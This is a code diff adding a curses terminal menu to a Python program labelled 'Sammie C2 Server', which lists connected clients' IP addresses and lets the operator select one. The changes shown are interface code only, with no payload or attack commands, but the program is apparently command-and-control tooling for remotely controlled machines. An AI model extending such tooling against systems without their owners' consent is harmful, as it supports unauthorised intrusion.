@@ -34,22 +34,48 @@ def listen_for_clients(port):
 
 def nice_menu_function(stdscr):
   stdscr.clear()
+  curses.curs_set(0)
+  curses.use_default_colors()
   stdscr.nodelay(True)
+  height,width = stdscr.getmaxyx()
 
   running = True
+
+  selected = 0
+
+  for i in range(0, curses.COLORS):
+    curses.init_pair(i + 1, i, -1)
 
   while running:
     c = stdscr.getch()
     curses.flushinp()
-    # Store the key value in the variable `c`
-    # Clear the terminal
     stdscr.clear()
-    
-    for i, client in enumerate(clients):
-      stdscr.addstr(i,0,client['addr'][0])
 
     if c == ord('q'):
       running = False
+    elif curses.KEY_RESIZE == c:
+      height,width = stdscr.getmaxyx()
+    
+    elif c == curses.KEY_DOWN and len(clients) > 0:
+      selected = (selected + 1) % len(clients)
+    elif c == curses.KEY_UP and len(clients) > 0:
+      selected = (selected - 1) % len(clients)
+
+    stdscr.addstr(0, 0, "Sammie C2 Server", curses.color_pair(5))
+    stdscr.addstr(1, 0, "Connected Clients", curses.color_pair(3))
+    stdscr.addstr(height-1, 0, "Press 'q' to quit server")
+
+    with lock:
+      if len(clients) == 0:
+        stdscr.addstr(3,0,"No clients connected")
+      else:
+        for i, client in enumerate(clients):
+          if i == selected:
+            stdscr.addstr(i+3,0,str(i) + ") " + client['addr'][0], curses.A_REVERSE)
+          else:
+            stdscr.addstr(i+3,0,str(i) + ") " + client['addr'][0])
+
+    stdscr.refresh()
 
     time.sleep(0.1)
 
